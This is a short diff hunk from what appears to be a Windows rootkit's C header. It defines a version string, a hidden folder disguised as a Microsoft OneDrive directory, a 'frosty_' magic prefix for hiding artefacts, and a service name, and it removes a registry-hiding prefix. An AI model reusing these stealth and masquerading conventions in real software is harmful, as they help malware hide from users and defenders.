@@ -4,7 +4,6 @@
 #define RK_VERSION "0.1b"
 
 #define HIDE_PATH L"C:\\ProgramData\\Microsoft OneDrive"
-#define HIDE_REG L"$$frosty_"
 #define MAGIC_PREFIX L"frosty_"
 
 #define RK_SERVICE_NAME MAGIC_PREFIX L"rk"
